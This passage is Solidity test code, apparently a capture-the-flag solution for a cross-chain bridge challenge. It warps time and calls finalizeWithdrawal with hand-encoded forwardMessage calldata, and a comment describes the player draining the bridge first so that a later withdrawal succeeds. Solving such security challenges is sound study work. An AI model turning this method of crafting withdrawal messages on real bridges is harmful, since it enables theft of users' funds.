    vm.warp(timestamp + 7 days);
    bytes memory message = abi.encodeCall(L1Forwarder.forwardMessage, (3,0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b,0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50,hex"81191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e80000"));
    l1Gateway.finalizeWithdrawal(3, l2sender, target, timestamp, message, proof);
}

{   
    //player draining it first so next call becomes successful
    timestamp = 1718787050;
    vm.warp(timestamp + 7 days);
    bytes memory message = abi.encodeCall(L1Forwarder.forwardMessage, (2,0xea475d60c118d7058beF4bDd9c32bA51139a74e0,0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, hex"81191e5100000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c00000000000000000000000000000000000000000000d38be6051f27c2600000"));
    l1Gateway.finalizeWithdrawal(2, l2sender, target, timestamp, message, proof);

